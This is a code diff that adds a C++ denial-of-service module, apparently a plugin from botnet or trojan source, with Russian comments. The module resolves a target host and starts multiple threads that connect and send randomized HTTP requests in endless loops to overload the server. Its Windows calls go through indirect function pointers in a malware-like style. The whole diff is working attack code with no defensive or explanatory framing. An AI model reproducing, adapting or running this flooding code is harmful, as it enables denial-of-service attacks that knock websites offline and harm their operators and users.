@@ -1,5 +1,124 @@
 #include "ddos.h"
 #include "Plugins.h"
+#include "Utils.h"
+
+
+
+
+
+
+
+TDDOS::TDDOS()
+{
+	MaxThreads = 10;
+}
+
+TDDOS::~TDDOS()
+{
+
+}
+
+bool TDDOS::Execute()
+{
+	if (URL.IsEmpty() || MaxThreads == 0)
+		return false;
+
+	// Инициализируем запрос
+	FRequest.CloseConnection = true;
+	FRequest.SetURL(URL.t_str());
+	if (FRequest.Host.IsEmpty())
+		return false;
+
+	FRequest.UserAgent = "Mozilla Compatible %s";
+	FRequest.Referer = "http://%s";
+
+	FSendData = FRequest.MakeRequestHeaders();
+
+	// Инициализируем библиотеку сокетов
+	if (!InitializeWSA()) return false;
+
+	// Получаем  адрес по имени хоста
+	FHostAddres = (LPHOSTENT)pgethostbyname(FRequest.Host.t_str());
+
+	if ( FHostAddres == NULL )
+		return false;
+
+	// Запускаем потоки
+	for (int i = 0; i < MaxThreads; i++)
+	{
+		StartThread(DDOSThreadProc, this);
+	}
+
+
+	while (1)  pSleep(100);
+
+
+	return true;
+}
+//----------------------------------------------------------------------------
+
+
+// Функция выполнения многократного подключения к испытуемому сайту
+DWORD WINAPI DDOSThreadProc(TDDOS *DDOS)
+{
+
+	DWORD BufSize = 1024;
+	TMemory Buf(BufSize);
+
+	while (true)
+	{
+		// Создаём сокет
+		SOCKET Socket = (SOCKET)psocket(AF_INET, SOCK_STREAM, 0);
+
+		if(Socket != SOCKET_ERROR)
+		{
+			// Подключаемся к серверу
+			struct sockaddr_in SockAddr;
+			SockAddr.sin_family		 = AF_INET;
+			SockAddr.sin_addr.s_addr = **(unsigned long**)DDOS->FHostAddres->h_addr_list;
+			SockAddr.sin_port		 = HTONS((unsigned short)DDOS->FRequest.Port);
+
+			// подключаемся к сокету
+			if ( (int)pconnect(Socket, (const struct sockaddr*)&SockAddr, sizeof( SockAddr ) ) != SOCKET_ERROR )
+			{
+				// Отправляем данные
+				string S;
+				string Temp = Random::RandomString2(30, 'a', 'z');
+                string Temp2 = Random::RandomString2(30, 'a', 'z');
+				S.Format(DDOS->FSendData.t_str(), Temp.t_str(), Temp2.t_str());
+
+				int Size = (int)psend(Socket, S.t_str(), S.Length(), 0);
+
+				// Для увеличения нагрузки на сервер пытаемся получить от сервера ответ
+				if (Size == S.Length())
+				{
+//					Size = (int)precv(Socket, Buf.Buf(), BufSize, 0);
+//					PCHAR S = Buf;
+//					Size++;
+                }
+
+
+			}
+			pclosesocket(Socket);
+		}
+		else
+		{
+			pSleep(10);
+		}
+
+		// Ждём до следующей отправки
+		pSleep(1);
+    }
+
+	return 0;
+}
+
+//----------------------------------------------------------------------------
+
+
+
+
+
 
 
 
